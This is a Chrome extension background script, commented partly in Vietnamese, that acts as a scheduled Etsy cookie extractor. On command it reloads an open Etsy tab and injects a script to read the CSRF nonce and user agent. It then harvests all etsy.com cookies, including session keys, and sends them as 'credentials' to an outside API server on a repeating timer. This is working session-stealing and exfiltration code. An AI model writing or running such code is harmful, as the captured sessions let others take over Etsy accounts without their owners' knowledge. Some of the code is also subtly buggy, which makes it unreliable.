let intervalId = null;
const dev = "https://api.cyberonegate.com";
const pro = "https://api.2hglobalstore.com";
let token = "";
let storeId = "";
let timer = 300;
let server = "production";
let sent = 0;
let sentSuccess = 0;
let sentFail = 0;
const delayTime = 5000;

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    if (message.action === "startCookieExtractor") {
        token = message.token;
        storeId = message.storeId;
        timer = Number(message.timer);
        server = message.server;
        sent = Number(message.sent);
        sentSuccess = Number(message.sentSuccess);
        sentFail = Number(message.sentFail);

        chrome.tabs.query({ }, (tabs) => {
            (async () => {
                const executeProcess = async () => {
                    try {
                        const etsyTab = tabs.find(tab => tab.url && tab.url.includes("https://www.etsy.com"));

                        if (!etsyTab) {
                            console.error("Không tìm thấy tab Etsy nào.");
                            return;
                        }

                        await new Promise((resolve) => {
                            chrome.tabs.reload(etsyTab.id, { bypassCache: true }, resolve);
                        });

                        await new Promise(resolve => setTimeout(resolve, delayTime));

                        const domResult = await new Promise(resolve => {
                            chrome.scripting.executeScript({
                                target: { tabId: etsyTab.id },
                                function: handleInteractDOM
                            }, (result) => resolve(result));
                        });

                        // Phần xử lý cookies và gửi dữ liệu cũ
                        const domData = domResult[0]?.result || {};

                        const cookies = await Promise.all([
                            getCookies("www.etsy.com"),
                            getCookies(".etsy.com")
                        ]).then(arr => arr.flat());

                        if (!validateCookies(cookies)) {
                            console.log("Missing required cookies");
                            return;
                        }

                        const isDone = await sendApi(cookies, domResult.userAgent, domResult.csrfNonce);

                        if(isDone) {
                            await chrome.runtime.sendMessage({
                                action: "sendData",
                                data: {
                                    ...domData,
                                    cookies,
                                    sent: sent++,
                                    sentSuccess: sentSuccess++,
                                    sentFail
                                }
                            });
                        } else {
                            await chrome.runtime.sendMessage({
                                action: "sendData",
                                data: {
                                    ...domData,
                                    cookies,
                                    sent: sent++,
                                    sentSuccess,
                                    sentFail: sentFail++
                                }
                            });
                        }
                    } catch (error) {
                        console.error("Lỗi trong quá trình xử lý:", error);
                    }
                }

                await executeProcess();

                intervalId = setInterval(
                    executeProcess,
                    timer * 60 * 1000
                );
            })()
            .then(() => sendResponse({ success: true }))
            .catch(error => sendResponse({ error: error.message }))
            .finally(() => sendResponse({ finished: true })); // 👉 Keep chanel always close
        });
        return true; // 👉 Keep chanel always open
    }

    if (message.action === "finishCookieExtractor") {
        if (intervalId) {
            clearInterval(intervalId);
            intervalId = null;
            console.log("Stopped interval time");
        }
        return true;
    }
});

const validateCookies = (cookies) => {
    const required = ["session-key-www", "et-v1-1-1-_etsy_com", "session-key-apex"];
    const cookieNames = cookies.map(c => c.name);
    return required.every(name => cookieNames.includes(name));
};

// 👉 Get Element from DOM
const handleInteractDOM = () => {
    // 👉 Get user agent
    const agent = navigator.userAgent;
    // 👉 Get csrfNonce
    const csrfMeta = document.querySelector('meta[name="csrf_nonce"]');
    const csrf = csrfMeta ? csrfMeta.getAttribute("content") : "No Data";

    return {
        csrfNonce: csrf,
        userAgent: agent,
    }
}

const getCookies = (domain) => {
    return new Promise(resolve => {
        chrome.cookies.getAll({ domain }, resolve);
    });
};

const sendApi = async (cookies, userAgent, csrfNonce) => {
    let urlApi = server === "development" ? dev : pro;
    const query = {
        keyword: "credentials",
        value: JSON.stringify({
            cookies: JSON.stringify(cookies),
            userAgent: userAgent,
            csrfNonce: csrfNonce
        })
    }
    try {
        await fetch(`${urlApi}/Store/UpdateMetadata/${storeId}`, {
            method: "PUT",
            body: JSON.stringify(query),
            headers: {
                "Content-Type": "application/json",
                Authorization: token
            }
        })
        return true;
    } catch (err) {
        return false;
    }
}
